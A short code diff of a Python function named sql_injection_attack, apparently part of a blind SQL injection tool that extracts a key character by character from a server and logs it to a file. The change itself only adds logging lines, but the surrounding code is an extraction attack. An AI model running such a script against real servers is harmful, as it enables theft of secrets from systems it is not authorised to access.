@@ -96,8 +96,9 @@ def sql_injection_attack():
     # chunk_verification(normal_reponse_time)
 
     with open(datetime.now().__str__() + ".txt", "a") as f:
-        # after loop each position index of the key to find the character
         key = ""
+        f.write(f"Server: {API_URL}\n")
+        f.write(f"Range start at 1\n")
         for key_index in range(3508):
             character = discover_char(key_index)
             f.write(character)
